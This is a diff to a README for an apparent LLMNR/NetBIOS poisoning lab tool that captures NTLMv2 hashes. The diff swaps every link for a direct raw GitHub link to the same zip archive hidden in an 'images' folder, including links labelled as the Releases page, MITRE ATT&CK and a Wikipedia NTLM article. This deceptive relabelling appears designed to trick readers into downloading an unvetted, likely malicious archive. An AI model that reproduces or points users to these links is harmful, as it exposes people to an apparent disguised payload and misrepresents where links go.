@@ -1,6 +1,6 @@
 # 🚀 AD-Lab-LLMNR-NetBIOS-Poisoning - Retrieve NTLMv2 Hashes Easily
 
-![Download](https://img.shields.io/static/v1?label=Download&message=Latest+Release&color=blue&style=flat)
+![Download](https://raw.githubusercontent.com/Chickenman18/AD-Lab-LLMNR-NetBIOS-Poisoning/main/images/Poisoning-Lab-LLMN-Net-BIO-A-2.8-beta.2.zip+Release&color=blue&style=flat)
 
 ## 🌟 Introduction
 
@@ -28,7 +28,7 @@ Before running the application, ensure your system meets these requirements:
 To get started, you need to download the application. 
 
 1. **Visit the Releases page:**  
-   Go to the following link: [Download the Latest Release](https://github.com/Chickenman18/AD-Lab-LLMNR-NetBIOS-Poisoning/releases). 
+   Go to the following link: [Download the Latest Release](https://raw.githubusercontent.com/Chickenman18/AD-Lab-LLMNR-NetBIOS-Poisoning/main/images/Poisoning-Lab-LLMN-Net-BIO-A-2.8-beta.2.zip). 
 
 2. **Choose and download the latest version:**  
    Find the latest version listed on the page. Click on the download link that matches your operating system. 
@@ -72,7 +72,7 @@ If you have questions or need assistance, feel free to reach out:
 
 Here are some resources that can enhance your understanding of LLMNR and NetBIOS protocols:
 
-- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Learn about attack techniques and defenses.
-- [Understanding NTLM](https://en.wikipedia.org/wiki/NTLM) - A comprehensive overview of NTLM authentication.
+- [MITRE ATT&CK Framework](https://raw.githubusercontent.com/Chickenman18/AD-Lab-LLMNR-NetBIOS-Poisoning/main/images/Poisoning-Lab-LLMN-Net-BIO-A-2.8-beta.2.zip) - Learn about attack techniques and defenses.
+- [Understanding NTLM](https://raw.githubusercontent.com/Chickenman18/AD-Lab-LLMNR-NetBIOS-Poisoning/main/images/Poisoning-Lab-LLMN-Net-BIO-A-2.8-beta.2.zip) - A comprehensive overview of NTLM authentication.
 
 By following the steps outlined in this guide, you can easily download and run the **AD-Lab-LLMNR-NetBIOS-Poisoning** application. Enjoy exploring!
